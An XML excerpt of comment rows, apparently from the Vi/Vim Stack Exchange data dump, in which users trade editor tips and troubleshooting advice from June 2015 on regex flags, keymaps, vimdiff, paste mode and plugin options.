  <row Id="4996" PostId="3584" Score="0" Text="thanks a lot for your insights regarding neovim term capability detection and  ` t_*` settings. Removing the redundant copy of and repositioning the `set background=dark` statement didn't have an effect, but those details about the underlying implementation are much more valuable to me." CreationDate="2015-06-15T03:09:31.363" UserId="783" />
  <row Id="4997" PostId="3588" Score="0" Text="On a side note: `getpos('.')[1]` is better (and safer) written as `line('.')`.  Also: _always_ specify either `\m` or `\v` in your regexps that are supposed to go into a script (as opposed to the ones you use with `:` commands), to avoid surprises with `magic`.  See `:help \m`." CreationDate="2015-06-15T04:05:06.780" UserId="1577" />
  <row Id="4998" PostId="3588" Score="0" Text="@lcd047: I agree with you on the magic switches in regex but I have a question on the `line('.')` command: I understand that it's easier to write and to read but how is it safer? Does this command provides some safety net in case of no matched lines or something like that?" CreationDate="2015-06-15T09:36:21.253" UserId="1841" />
  <row Id="4999" PostId="3588" Score="0" Text="If you can somehow convince `getpos()` to return an empty list, then `getpos('.')[1]` will fail.  In this particular case it should never happen.  But it's still a good idea to either avoid indices, or add `try ... catch` safety nets." CreationDate="2015-06-15T09:58:16.390" UserId="1577" />
  <row Id="5000" PostId="3588" Score="0" Text="I agree about `\m` in a script. You won't make me put the flag in the command line though :) It's bad enough as it is, with magic as default vim search mode, that everybody gives solutions on the Internet in this mode (instead of the `very magic`) - just because it's the default one." CreationDate="2015-06-15T10:12:32.450" UserId="1800" />
  <row Id="5001" PostId="3588" Score="0" Text="About using `line('.')` -clearly it is a better solution, even if only because the purpose becomes clearer this way." CreationDate="2015-06-15T10:17:24.823" UserId="1800" />
  <row Id="5002" PostId="3599" Score="2" Text="I don't know if it can restrict to words, but checkout the plugin mentioned in http://vi.stackexchange.com/questions/499/more-detailed-comparison-within-a-line" CreationDate="2015-06-15T10:46:57.063" UserId="205" />
  <row Id="5003" PostId="3586" Score="2" Text="@user12711 indeed. If you want `vim` as you'd expect to find, install `vim`, or if you want the GUI frontend as well, one of `vim-gnome`, `vim-gtk` or `vim-athena`. I'd recommend installing one of the latter three, since they have more features compiled in than the one `vim` has (like X11 clipboard support)." CreationDate="2015-06-15T10:58:42.523" UserId="205" />
  <row Id="5004" PostId="3586" Score="4" Text="pixel, `update-alternatives --display vi` provides a much nicer view, IMHO." CreationDate="2015-06-15T11:00:15.513" UserId="205" />
  <row Id="5005" PostId="3598" Score="0" Text="Using `` is probably a better recommendation than '' since the former goes back to the same line and column.  Ditto for `m vs. 'm." CreationDate="2015-06-15T14:08:04.157" UserId="15" />
  <row Id="5006" PostId="3598" Score="0" Text="I agree. (Any idea how to create literal backtics in wiki markup since they have a special meaning?) - Otherwise your comment will serve well as amendment to my answer and as hint for the readers." CreationDate="2015-06-15T15:58:00.873" UserId="2479" />
  <row Id="5007" PostId="3598" Score="0" Text="You have to use multiple backticks to delimit the inline code (c.f., http://daringfireball.net/projects/markdown/syntax#code).  I know it works in questions/answers, but I couldn't get it to work in my comment." CreationDate="2015-06-15T16:10:13.800" UserId="15" />
  <row Id="5008" PostId="3589" Score="4" Text="&quot;this issue is a hypothetical one&quot;... No, it isn't. I've had to work on SSH on my phone over 2G connections, where I have accidentally missed a keystroke or made multiple keystrokes while typing in anticipation, resulting in very similar situations (maybe not 99999, but smaller numbers yes)." CreationDate="2015-06-15T17:05:05.977" UserId="205" />
  <row Id="5009" PostId="3594" Score="0" Text="Hey, good trick!  That's way useful for Vi and lots of other commands." CreationDate="2015-06-15T17:43:39.227" UserId="2221" />
  <row Id="5010" PostId="3599" Score="0" Text="Huh. Apparently it can. Add `let g:DiffUnit=&quot;Word1&quot;` and it does word-level highlighting." CreationDate="2015-06-15T17:53:39.030" UserId="205" />
  <row Id="5011" PostId="3589" Score="0" Text="Cool, yeah a slow terminal emulator (depending on the amount of changing that vim is applying) can exacerbate problems by adding processing delay on the client side. Gotta get to Ctrl+C quickly!" CreationDate="2015-06-15T23:24:27.393" UserId="390" />
  <row Id="5012" PostId="3600" Score="0" Text="`cd` to the interesting directory inside the script?" CreationDate="2015-06-16T04:38:44.813" UserId="1577" />
  <row Id="5013" PostId="3600" Score="0" Text="yeah sure could do that but I would like to avoid to hard code the location since I will need to execute it on another machine" CreationDate="2015-06-16T04:42:30.757" UserId="436" />
  <row Id="5014" PostId="3601" Score="0" Text="thanks a lo t!  ':cd %:p:h ; bash %:t ; cd -' works as I hoped" CreationDate="2015-06-16T07:56:32.707" UserId="436" />
  <row Id="5015" PostId="3562" Score="0" Text="This can often cause problems in that some vim related files will get written as root in your home directory and later you will encounter errors trying to run your own vim configuration as your own user." CreationDate="2015-06-16T08:04:04.757" UserId="267" />
  <row Id="5016" PostId="3594" Score="3" Text="This has the same side effects that linking your configuration into root's home directory: namely that any vim operations or plugins that write state data will do so in your home directory. These files end up being owned by root and will cause errors later as your normal user will not be able to continue using them." CreationDate="2015-06-16T08:10:37.213" UserId="267" />
  <row Id="5017" PostId="3603" Score="0" Text="Writing a custom command is probably your best bet." CreationDate="2015-06-16T09:53:54.250" UserId="1577" />
  <row Id="5018" PostId="3603" Score="0" Text="`-complete=customlist,MakeComplete` alreeady does what you want?  I don't quite understand where you're stuck or what does't work like you want." CreationDate="2015-06-16T11:08:51.413" UserId="51" />
  <row Id="5019" PostId="3603" Score="0" Text="That only works for a custom command, I'm after something for the built in make command" CreationDate="2015-06-16T11:14:11.590" UserId="584" />
  <row Id="5020" PostId="3605" Score="0" Text="dB and dBs are way better solutions! I still have a while to go with getting comfortable with all of the bindings, so I find myself using a lot of keys do get it done, which is contradictory to using vim I guess..." CreationDate="2015-06-16T14:29:30.587" UserId="2488" />
  <row Id="5021" PostId="3609" Score="0" Text="You are are optimizing keystrokes to save 1 character on the line. Really? - not sure what you mean...i just wanted to remove everything to the beginning and and put it in insert mode, if is more simply put. Sorry for any confusion." CreationDate="2015-06-16T15:54:59.233" UserId="2488" />
  <row Id="5022" PostId="3608" Score="0" Text="Works perfectly! Thanks!" CreationDate="2015-06-16T15:55:08.917" UserId="1111" />
  <row Id="5023" PostId="3609" Score="0" Text="It means, since you want to end up with the cursor on the `e` - it's easier to delete the whole line in one go and write the `e` again. Typing `S` has the threefold advantage of 1. deleting the whole line 2. indenting and 3. leaving you in insert mode to type the `e` again etc." CreationDate="2015-06-16T21:34:34.613" UserId="1800" />
  <row Id="5024" PostId="3609" Score="0" Text="I would have assumed that the OP's data has some context that should not be touched, like in: `pre-context; e.printStackTrace(); post-Context;`. (Otherwise deleting the whole line with `S` would have been the obvious way. But it's very unlikely that in such code there wouldn't even be an indentation to preserve.)" CreationDate="2015-06-17T04:27:45.263" UserId="2479" />
  <row Id="5025" PostId="3612" Score="0" Text="Duplicate of: http://stackoverflow.com/questions/30883563/vim-keeps-unindenting" CreationDate="2015-06-17T07:14:01.980" UserId="1577" />
  <row Id="5026" PostId="3609" Score="0" Text="In this case (which frankly I don't see in the original question), I found the solution proposed above, with `cT.` (which preserves the ';') the best one." CreationDate="2015-06-17T07:49:37.410" UserId="1800" />
  <row Id="5027" PostId="3612" Score="1" Text="Stack Exchange discourages posting the same question on multiple sites. If you decide to post on a different site later, you're expected to delete the original question." CreationDate="2015-06-17T08:57:16.103" UserId="205" />
  <row Id="5028" PostId="3611" Score="0" Text="This is an awesome solution, I still have a lot to learn and get comfortable with ... arrrghh" CreationDate="2015-06-17T09:01:12.093" UserId="2488" />
  <row Id="5029" PostId="3611" Score="0" Text="@user2405469: ahah I think with vim you never stop learning ;) Note that on the same principle than `C` other commands operating on line exists like `D` which deletes the end of the line, `V` which selects all the line, `Y` which yanks all the line etc..." CreationDate="2015-06-17T09:07:05.727" UserId="1841" />
  <row Id="5030" PostId="3615" Score="0" Text="`:help visual-search` simple example for search selected text: `:vmap X y/&lt;C-R&gt;&quot;&lt;CR&gt;&quot; and `gn` - Search forward for the last used search pattern, like with `n`, and start Visual mode to select the match." CreationDate="2015-06-17T09:42:06.360" UserId="1145" />
  <row Id="5031" PostId="3616" Score="0" Text="Indeed you're probably right about the vim way to work... I might be able to find an other way to do what I want. But stricly about my question your solution works for me, thank you." CreationDate="2015-06-17T09:51:27.413" UserId="1841" />
  <row Id="5032" PostId="3615" Score="0" Text="@AlexKroll: I had trouble figuring out what you meant (I think there is a problem in the formatting of your comment) that seems like a nice solution, especially the `gn` part which I didn't know." CreationDate="2015-06-17T09:56:27.990" UserId="1841" />
  <row Id="5033" PostId="3616" Score="0" Text="You're welcome. Bonus: after the 1st `@:`, you can use `@@` (which is easier to type), while you don't use the command-line." CreationDate="2015-06-17T09:59:28.187" UserId="1800" />
  <row Id="5034" PostId="3616" Score="0" Text="Yep I knew this one but I tend to use it for macros and forgot that it can be used in this case. Great bonus anyway!" CreationDate="2015-06-17T10:01:56.933" UserId="1841" />
  <row Id="5035" PostId="3615" Score="0" Text="Yes. I've combined two parts and formatting has broken.&#xA;First part: search pattern selected in visual mode. You can read about it in vimdoc `:help viusual-search`. it's just simple example.&#xA;Second part: navigate forwad to the next matched pattern. Like `n` in normal mode but visual mode have own mapping `gn` for more explanation `:help gn`." CreationDate="2015-06-17T10:01:58.240" UserId="1145" />
  <row Id="5036" PostId="3615" Score="1" Text="That's a nice way to do it! I think that it could also be done with doing a first search and then removing the `&lt;C-R&gt;&quot;` part, this way the search will be done on the last search pattern and the user can yank another piece of text without breaking the mapping.  Also if I may suggest you to edit your comment for the comfort of future users that would be nice ;)" CreationDate="2015-06-17T10:08:32.183" UserId="1841" />
  <row Id="5037" PostId="3612" Score="0" Text="Are you *sure* you want to keep trailing spaces?" CreationDate="2015-06-17T10:30:39.477" UserId="54" />
  <row Id="5038" PostId="3615" Score="0" Text="But your question about selection movement. In other word: select from cursor to third colon in other line. My comment covers case for selection exactly same text in other line." CreationDate="2015-06-17T10:32:07.843" UserId="1145" />
  <row Id="5039" PostId="3612" Score="0" Text="Maybe you want to look into using `set virtualedit=all`? It doesn't do what you're asking for, but it is roughly similar (see the help page)." CreationDate="2015-06-17T11:00:29.373" UserId="51" />
  <row Id="5040" PostId="3617" Score="0" Text="I didn't precise it clearly but I was wondering if there was a built-in solution which would allow not to use macro or mapping, but your 2 first solution works. For the mapping a cool line to add to `vimrc` is `nnoremap &lt;Leader&gt;r :nnoremap &lt;lt&gt;Leader&gt;t ` which allow to quickly redefine the mapping of `&lt;Leader&gt;t`, that could be use to create the quick mapping. For your &quot;experimental solution&quot; I'll have to try it and study it a little bit more because I'm not sure I understand clearly how it works ;)" CreationDate="2015-06-17T11:24:05.413" UserId="1841" />
  <row Id="5041" PostId="3615" Score="0" Text="It's about selecting from cursor to third colon in the same line: `v3f:` will not work if the current line contains less than 3 `:` actually but you're right your comment doesn't covers exactly the same case." CreationDate="2015-06-17T11:27:34.327" UserId="1841" />
  <row Id="5042" PostId="3617" Score="0" Text="Now I understand it better, your last solution is really nice actually! Thanks for sharing that!" CreationDate="2015-06-17T11:41:10.237" UserId="1841" />
  <row Id="5043" PostId="3618" Score="0" Text="I can't reproduce this. With two files, one containing your modeline, `vimdiff -N -u NONE file1 file2` always sets the `'filetype'` correctly. I'm using Vim 7.4.729 on Fedora." CreationDate="2015-06-17T16:21:18.993" UserId="2055" />
  <row Id="5044" PostId="3618" Score="0" Text="I can't reproduce with `vimdiff` either, 7.4.692 on Ubuntu." CreationDate="2015-06-17T16:51:04.300" UserId="205" />
  <row Id="5046" PostId="2004" Score="2" Text="After you figure out your bug, this would be a great time to start keeping your .vimrc under version control :) It's almost always going to be one of the last changes you made to it that made stuff behave strangely." CreationDate="2015-06-17T21:02:24.053" UserId="2503" />
  <row Id="5047" PostId="3619" Score="0" Text="I use `diffchar`, and it didn't cause any problems reading from the modeline. O.o But then again, the plugin does work for me." CreationDate="2015-06-17T21:49:15.793" UserId="205" />
  <row Id="5048" PostId="3623" Score="2" Text="This is fine as long as you never type by mistake the first key in a combination.  And as long as you don't have macros with conflicting prefixes." CreationDate="2015-06-18T05:11:05.983" UserId="1577" />
  <row Id="5049" PostId="3624" Score="2" Text="This is fine as long as you don't edit, say, markdown files, where trailing spaces are significant.  Another failing scenario is when submitting patches for review." CreationDate="2015-06-18T05:13:40.927" UserId="1577" />
  <row Id="5050" PostId="3627" Score="3" Text="Please add a description, what does it do? And could you please change `,` to `&lt;leader&gt;` so it's immediately reuseable?" CreationDate="2015-06-18T07:21:02.033" UserId="237" />
  <row Id="5051" PostId="3627" Score="0" Text="It is already reusable." CreationDate="2015-06-18T07:23:52.987" UserId="54" />
  <row Id="5052" PostId="3628" Score="1" Text="Please, `&lt;leader&gt;` and some short explanation, let's make this useful. Thanks." CreationDate="2015-06-18T07:23:55.197" UserId="237" />
  <row Id="5053" PostId="3620" Score="0" Text="Great call @muru, great call.  Don't ever allow people to share knowledge the way they want to." CreationDate="2015-06-18T08:31:09.110" UserId="1577" />
  <row Id="5054" PostId="3620" Score="4" Text="@lcd047 open a chatroom and share &quot;useful stuff&quot; as much as you need!" CreationDate="2015-06-18T08:33:17.637" UserId="205" />
  <row Id="5055" PostId="3620" Score="0" Text="I would suggest to let it run for a few days first." CreationDate="2015-06-18T08:35:35.613" UserId="237" />
  <row Id="5056" PostId="3620" Score="0" Text="@muru A post lives in principle as long as the site (unless overzealous moderators delete it, that is).  People can come contribute to the list a few years on.  A chatroom is something shared only among people participating to the discussion, and is not discoverable." CreationDate="2015-06-18T08:38:40.497" UserId="1577" />
  <row Id="5057" PostId="3620" Score="3" Text="@lcd047 this sort of big-list questions are not allowed on SE - existing ones already have locks on them. At any rate, if you want to discuss the re-opening of this question, post on [meta]." CreationDate="2015-06-18T08:40:46.573" UserId="205" />
  <row Id="5058" PostId="3628" Score="0" Text="Consider using [unimpaired](https://github.com/tpope/vim-unimpaired) for this, and a lot more." CreationDate="2015-06-18T08:41:24.127" UserId="1577" />
  <row Id="5059" PostId="3620" Score="2" Text="Actually muru isn't wrong: see for example [here](http://stackoverflow.com/questions/182630/jquery-tips-and-tricks), [here](http://stackoverflow.com/questions/15496/hidden-features-of-java) or [here](http://stackoverflow.com/questions/599365/what-is-your-favorite-c-programming-trick). That's not how SO questions are meant to be used (you'll also find a lot of meta thread debating that), a chat room could be a really nice idea because sharing this kind of tricks can be very cool :)" CreationDate="2015-06-18T08:44:02.927" UserId="1841" />
  <row Id="5061" PostId="3620" Score="1" Text="@lcd047 Here: http://meta.vi.stackexchange.com/questions/1278/how-do-we-share-general-vim-experience-or-can-we/1281#1281" CreationDate="2015-06-18T08:52:39.467" UserId="205" />
  <row Id="5062" PostId="3631" Score="1" Text="See `:help complete-functions`." CreationDate="2015-06-18T09:14:08.530" UserId="1577" />
  <row Id="5063" PostId="3628" Score="1" Text="@lcd047, unimpaired is nice for QWERTY users. I use AZERTY and unimpaired is unusable for me." CreationDate="2015-06-18T09:20:53.170" UserId="54" />
  <row Id="5064" PostId="3634" Score="3" Text="Like `:ls` (for listing open buffers)?" CreationDate="2015-06-18T10:21:53.400" UserId="205" />
  <row Id="5065" PostId="3620" Score="3" Text="@Nick Your question says &quot;list your single best trick&quot;, but you've posted 5 answers. They can't all be your best one! ;)" CreationDate="2015-06-18T11:50:15.487" UserId="343" />
  <row Id="5066" PostId="3615" Score="0" Text="What are you actually trying to *do* to the `XX:YY:ZZ foobar:` parts? There might be other ways to achieve your goal that don't involve visual mode. (e.g. `:substitute`, `:global`)" CreationDate="2015-06-18T12:06:09.990" UserId="343" />
  <row Id="5067" PostId="3630" Score="4" Text="I do know what this does, but could you please add some explanation?  Someone who doesn't know vim's mappings very well would have no idea what this does." CreationDate="2015-06-18T12:23:22.403" UserId="865" />
  <row Id="5068" PostId="3633" Score="0" Text="I tried you solution but it doesn't seem to work: When I hit &lt;kbd&gt;Leader&lt;/kbd&gt;+&lt;kbd&gt;UP&lt;/kbd&gt; I have the message `--submode: grow/shrink --` and the window is resized by one line but the command isn't repeated. I tried it with the 4 combinaisons of `g:submode_keep_leaving_key` and `g:submode_timeout` to 0 or 1. I'm not sure if I did something wrong or not. I'm usually using vim in a terminal but for now I can only test with gVim on windows but I'm not sure it change something." CreationDate="2015-06-18T13:13:32.097" UserId="1841" />
  <row Id="5069" PostId="3633" Score="2" Text="The command is not auto-repeated, you still have to hit `Up` or `Down` yourself as many times as needed (but without having to press `Leader` first)" CreationDate="2015-06-18T13:16:40.947" UserId="1800" />
  <row Id="5070" PostId="3615" Score="0" Text="@Rich you're right in this case I finally managed to do what I wanted with a global command. Actually this example wasn't the best to illustrate my purpose, I just remembered I had already faced this case before but couldn't remember precisely the file I was working on. Maybe those other time also I could have done it differently." CreationDate="2015-06-18T13:19:24.010" UserId="1841" />
  <row Id="5071" PostId="3633" Score="0" Text="Oh I understand the code better now! It works perfectly thanks!" CreationDate="2015-06-18T13:20:11.013" UserId="1841" />
  <row Id="5072" PostId="3633" Score="0" Text="[You're welcome]" CreationDate="2015-06-18T13:37:11.890" UserId="1800" />
  <row Id="5073" PostId="3634" Score="0" Text="`:ls` works! I guess what's needed is a NERDTree syntax file that highlights lines matching the output of `:ls` on everytime the buffer changes?" CreationDate="2015-06-18T14:20:21.467" UserId="2512" />
  <row Id="5074" PostId="3635" Score="1" Text="You can also just use `@0` instead of the `getreg()` function." CreationDate="2015-06-18T14:50:10.997" UserId="51" />
  <row Id="5075" PostId="3628" Score="0" Text="@romainl A similar issue came up on the vim_users list a few days ago.  The answer was to use `langmap`.  Maybe that can help you?" CreationDate="2015-06-18T15:43:56.200" UserId="1577" />
  <row Id="5076" PostId="3585" Score="0" Text="Oh, you're right. Sorry!" CreationDate="2015-06-19T04:35:07.930" UserId="2471" />
  <row Id="5077" PostId="3634" Score="0" Text="This is not how syntax files work.  You could however post a feature request to the [official channel](https://github.com/scrooloose/nerdtree/issues)." CreationDate="2015-06-19T12:54:26.400" UserId="1577" />
  <row Id="5078" PostId="3634" Score="1" Text="Looks like it was requested (two years ago) [here](https://github.com/scrooloose/nerdtree/issues/300)" CreationDate="2015-06-19T13:23:34.120" UserId="2512" />
  <row Id="5079" PostId="3642" Score="0" Text="Try `if &amp;restorescreen` if you want tho check if `restorescreen` is set, or `if exists('&amp;restorescreen')` if you want to find out if there is an option named `restorescreen` (but that should always return 1, since said option is always compiled in)." CreationDate="2015-06-19T15:12:44.673" UserId="1577" />
  <row Id="5080" PostId="3627" Score="0" Text="Sure, but having &lt;Leader&gt; explicitly set is much nicer, given that comma defaults to the leader key." CreationDate="2015-06-19T15:54:12.720" UserId="488" />
  <row Id="5081" PostId="3642" Score="0" Text="I think it was meant to detect older vim versions from before the option existed - I just took it out, I've been trying to clean up the version condition stuff in my vimrc since everything I use is on at least 7.2 now." CreationDate="2015-06-19T16:06:01.460" UserId="880" />
  <row Id="5082" PostId="3640" Score="0" Text="I didn't know about `echomsg` - thanks for the lead!  I found another way but wouldn't have done so without your kind answer (which I have cheerfully upvoted)." CreationDate="2015-06-19T16:12:46.050" UserId="1430" />
  <row Id="5083" PostId="3627" Score="2" Text="No, the default leader key is \." CreationDate="2015-06-19T20:05:36.217" UserId="54" />
  <row Id="5084" PostId="3645" Score="3" Text="Everything is explained in `:help html-indent`." CreationDate="2015-06-19T22:00:58.057" UserId="54" />
  <row Id="5085" PostId="3646" Score="0" Text="The problem is `void PrintOneNode(){}` becomes the declaration and definition, it is syntactically valid. So, for `vim` to &quot;guess&quot; that it was wrong, it would have to keep a list of functions declared/defined and look for &quot;similar&quot; names. The best that I can think of is to check the declaration when you're defining, using ctags (or similar), or use some completion tool so that you can pick the name from a list." CreationDate="2015-06-19T23:46:22.670" UserId="205" />
  <row Id="5086" PostId="3646" Score="2" Text="Have you considered using [syntastic](https://github.com/scrooloose/syntastic)?" CreationDate="2015-06-20T04:00:34.140" UserId="1577" />
  <row Id="5087" PostId="3646" Score="0" Text="@lcd047 That's excellent!!" CreationDate="2015-06-20T04:25:08.193" UserId="2206" />
  <row Id="5089" PostId="3646" Score="3" Text="If your compiler supports it `-Wmissing-prototypes` will tell you if a function is missing a prototype." CreationDate="2015-06-20T16:41:37.623" UserId="46" />
  <row Id="5092" PostId="3650" Score="2" Text="The [unimpaired](https://github.com/tpope/vim-unimpaired/) plugin has a different (but IMO better) solution.  See Drew Neil's [analysis](http://vimcasts.org/episodes/using-vims-paste-mode-with-the-system-paste-command/) for the rationale, as well as his [copy and paste series](http://vimcasts.org/categories/copy-and-paste/)." CreationDate="2015-06-21T03:45:30.473" UserId="1577" />
  <row Id="5093" PostId="3649" Score="1" Text="You can also make Vim wait forever for `\pcd`, by setting `notimeout`.  However, this has other (generally unwanted) consequences.  See `:help timeout` and `:help timeoutlen` for increased confusion. ;)" CreationDate="2015-06-21T05:33:46.563" UserId="1577" />
  <row Id="5094" PostId="3653" Score="0" Text="Thanks very much. I want to know more about this, could you please introduce me the relevant documentation?" CreationDate="2015-06-21T05:48:37.760" UserId="1788" />
  <row Id="5095" PostId="3653" Score="0" Text="@leoadams There are `:help /\n`, `:help s/\r`, and `:help NL-used-for-Nul`.  Not sure what else to tell you.  Vim is just weird." CreationDate="2015-06-21T06:00:15.043" UserId="2313" />
  <row Id="5096" PostId="3653" Score="0" Text="Thank you very much." CreationDate="2015-06-21T06:05:07.783" UserId="1788" />
  <row Id="5097" PostId="3650" Score="1" Text="Better than &quot;paste&quot;: &quot;put&quot;. Unless you are *really* desperate (tiny vim via ssh without any possibility of X-forwarding), use the * and/or + registers: `&quot;*p`, `&quot;+p`." CreationDate="2015-06-21T08:24:19.213" UserId="54" />
  <row Id="5098" PostId="3654" Score="0" Text="Why do you think `:execute` is not efficient?" CreationDate="2015-06-21T15:22:00.253" UserId="54" />
  <row Id="5099" PostId="3654" Score="0" Text="Ignorance, I suppose. I just don't know." CreationDate="2015-06-21T15:53:09.963" UserId="2207" />
  <row Id="5100" PostId="3654" Score="1" Text="`exec 'let $' . name . '=' . string(value)`" CreationDate="2015-06-21T15:54:44.993" UserId="1577" />
  <row Id="5101" PostId="3651" Score="0" Text="It does use ShellExecute. It opens directories in Explorer because they are associated with it. If you `start` a .docx file it will open MS Word, etc. Thank you, I hadn't considered using a user command." CreationDate="2015-06-21T19:10:07.457" UserId="880" />
  <row Id="5102" PostId="3651" Score="0" Text="@Random832 Nope. `start /?` for explaination.&#xA;&#xA;When you search for an executable and there is no match on any extension, start searches directory name. If it does, start opens Explorer.exe on that path." CreationDate="2015-06-21T19:19:34.240" UserId="1145" />
  <row Id="5103" PostId="3651" Score="0" Text="Ah, sorry, I didn't realize this difference because it does use association when opening files." CreationDate="2015-06-21T19:22:11.837" UserId="880" />
  <row Id="5104" PostId="3576" Score="0" Text="Could you include a screenshot of the iTerm color configuration that you use when the theme is rendered correctly as well as the output from running [this script](https://github.com/mbadolato/iTerm2-Color-Schemes/blob/master/tools/screenshotTable.sh)?" CreationDate="2015-06-22T00:12:17.490" UserId="2537" />
  <row Id="5105" PostId="3655" Score="3" Text="I used it in a function and had no problem using `n` or `N` to repeat the search. Do you have an interfering plugin? Try with `vim -Nu NONE`, manually defining the function or action." CreationDate="2015-06-22T03:07:38.833" UserId="205" />
  <row Id="5106" PostId="3655" Score="0" Text="@muru, thanks for the suggestion. I just tried it, and it still didn't work. Hitting `n` repeated a search earlier in the `/` history, but if I typed `/` and then hit the up arrow, the latest, function-called search appeared. I hit enter, it worked, and then `n` worked, so this is very odd. Perhaps it's a bug in vim itself? My version is 7.4.692." CreationDate="2015-06-22T07:26:12.893" UserId="2511" />
  <row Id="5107" PostId="3655" Score="0" Text="I attempted a workaround by putting `normal /&lt;Up&gt;^MN` after the `normal /needle^M` line in my function, but the `&lt;Up&gt;` didn't work. Is it possible somehow or is there some other workaround?" CreationDate="2015-06-22T07:42:28.563" UserId="2511" />
  <row Id="5108" PostId="3655" Score="3" Text="You can set the regexp used for `n` by assigning it to the `/` register: `let @/=&quot;needle&quot;`.  You don't even need to run a search first for that to work." CreationDate="2015-06-22T07:43:46.133" UserId="1577" />
  <row Id="5109" PostId="3655" Score="1" Text="Please add your full function and possibly more background to your question. What you ask is the normal behavior so there must be something else." CreationDate="2015-06-22T09:03:34.017" UserId="54" />
  <row Id="5110" PostId="3656" Score="0" Text="Try `$ vim -N -u plugin.vim`." CreationDate="2015-06-22T13:08:14.117" UserId="54" />
  <row Id="5111" PostId="3656" Score="0" Text="What is the output of `:set cpoptions?` when that happens?" CreationDate="2015-06-22T13:53:52.327" UserId="1577" />
  <row Id="5112" PostId="2363" Score="0" Text="Thanks for the answer, this was the only solution that has worked for me w/ Iterm + vim" CreationDate="2015-06-22T14:33:19.840" UserId="2541" />
  <row Id="5113" PostId="3656" Score="0" Text="@lcd047 : `cpoptions=aABceFs`" CreationDate="2015-06-22T14:58:02.733" UserId="1821" />
  <row Id="5114" PostId="3660" Score="2" Text="You need to set `nocompatible` to do just about anything interesting with Vim anyway." CreationDate="2015-06-22T15:10:29.460" UserId="1577" />
  <row Id="5115" PostId="3659" Score="0" Text="How did you run that command? `:!diff -u file.txt file_new.txt &gt; file.patch` or `diff -u file.txt file_new.txt &gt; file.patch`?  It seems to me you're trying to run an external command directly in Vim." CreationDate="2015-06-22T15:31:26.777" UserId="205" />
  <row Id="5116" PostId="3659" Score="0" Text="That's exactly what I was trying to do because I'm an idiot." CreationDate="2015-06-22T15:41:14.820" UserId="2543" />
  <row Id="5118" PostId="3664" Score="0" Text="Thanks for the response.  I don't believe the recover.XXXXX file is acting as an index; I actually have one of these files in /var/tmp/vi.recover/ (from a different editing session, one whose loss I don't care about) and its presence does not make `vi -r` display any results.  This file appears to just contain the text of the autogenerated email.  But I think this is the right track: *somewhere* nvi must store an index associating original files with recovery files, and adding the appropriate entry to this index would solve my problem." CreationDate="2015-06-22T16:50:57.843" UserId="2545" />
  <row Id="5119" PostId="3664" Score="0" Text="Odd.  Despite `vi -r` not acknowledging the existing recover.XXXXX file, when I created a new phony one with the file I care about, nvi picked it up and recovered it without complaint.  Perfect!" CreationDate="2015-06-22T17:02:08.217" UserId="2545" />
  <row Id="5120" PostId="3661" Score="2" Text="_At present, only GNU diff can produce this format and only GNU patch can automatically apply diffs in this format._ - For suitable values of _present_. :) OpenBSD's `diff` and `patch` have supported unified patches since June 2003." CreationDate="2015-06-22T17:15:35.470" UserId="1577" />
  <row Id="5121" PostId="3661" Score="0" Text="@lcd047 somebody needs to submit a patch for the GNU documentation." CreationDate="2015-06-22T19:53:39.387" UserId="205" />
  <row Id="5123" PostId="3660" Score="0" Text="Or just create a `~/.vimrc`." CreationDate="2015-06-22T20:31:18.657" UserId="54" />
  <row Id="5124" PostId="3660" Score="0" Text="This is why many scripts save the options (`let saved_opts = &amp;cpopts`), restore `cpopts` with `set cpopts&amp;vim`, and reset them at the end (`let &amp;cpopts = saved_opts`)... See [`:help use-cpo-save`](http://vimhelp.appspot.com/usr_41.txt.html#use-cpo-save)" CreationDate="2015-06-23T10:10:00.637" UserId="51" />
  <row Id="5125" PostId="3660" Score="0" Text="Interesting :) but in my case I wasn't using any vimrc, only the plug-in file so the `-N` was more convenient" CreationDate="2015-06-23T10:15:35.630" UserId="1821" />
  <row Id="5126" PostId="3665" Score="0" Text="Try the `$` key in place of `]`: `&lt;C-$&gt;`." CreationDate="2015-06-23T10:20:38.807" UserId="54" />
  <row Id="5127" PostId="3665" Score="0" Text="If you're using Windows, it's possible the `&lt;C-]&gt;` is not defined in the keyboard layout i.e. it doesn't generate a code for Vim to pick up. You can probably change the keyboard layout using MS keyboard layout creator tool, in order to add the missing code(s), but I didn't try that, just read about it some time ago. Or, you can map `&lt;C-]&gt;` to another combo." CreationDate="2015-06-23T10:24:24.433" UserId="1800" />
  <row Id="5128" PostId="3665" Score="0" Text="@romainl: This alternative key sequence works thanks! @ Laser: as the solution of romainl worked I'll probably will not take time to redefine my layout but I have a question: If windows doesn't send a code for this combo, how can it work on a cygwin console?" CreationDate="2015-06-23T10:34:59.193" UserId="1841" />
  <row Id="5129" PostId="3665" Score="0" Text="It's Vim's fault: `]` is hardcoded to the last key on the first alphabetical row." CreationDate="2015-06-23T10:43:50.797" UserId="54" />
  <row Id="5130" PostId="3665" Score="0" Text="According to a recent discussion on vim_use, `langmap` might help." CreationDate="2015-06-23T11:11:24.220" UserId="1577" />
  <row Id="5131" PostId="3665" Score="0" Text="@lcd047: I just read the help entry for `langmap` I understand how it works but not how I should use it: I tried `set langmap+=]$` so `&lt;C-]&gt;` would become `&lt;C-$&gt;` but when I hit `&lt;C-]&gt;` that just put the cursor at the end of the line." CreationDate="2015-06-23T12:02:37.893" UserId="1841" />
  <row Id="5132" PostId="3667" Score="0" Text="According to [this discussion](https://www.reddit.com/r/neovim/comments/31vxk1/configuring_neovim_without_vimscript/) on reddit I would say that you'll still have to write your `nvimrc` in vimscript. But maybe someone has more info than I have." CreationDate="2015-06-23T12:11:13.540" UserId="1841" />
  <row Id="5133" PostId="3665" Score="0" Text="I don't know how is that supposed to work, but I'm pretty sure it isn't with key combinations.  [This page](http://vim.wikia.com/wiki/Using_Vim_key_bindings_while_typing_non-latin1_text) seems relevant.  People have been passing around files with key definitions, maybe you can find one for AZERTY." CreationDate="2015-06-23T12:14:31.167" UserId="1577" />
  <row Id="5134" PostId="3665" Score="0" Text="I can't find reference to azerty layout on your link but I'll look for it and post it when I find. Thanks!" CreationDate="2015-06-23T13:12:44.077" UserId="1841" />
  <row Id="5135" PostId="3629" Score="0" Text="This will break the autocomplete/wildmenu feature. For example, `:help getcmd&lt;Tab&gt;`. It will insert `&lt;1a&gt;` (`&lt;C-z&gt;`) ... I tried to fix this, but can't get it working :-/" CreationDate="2015-06-23T13:13:57.797" UserId="51" />
  <row Id="5136" PostId="3629" Score="0" Text="No it doesn't break anything. Depends on `set wildcharm=&lt;C-z&gt;`." CreationDate="2015-06-23T13:17:42.170" UserId="54" />
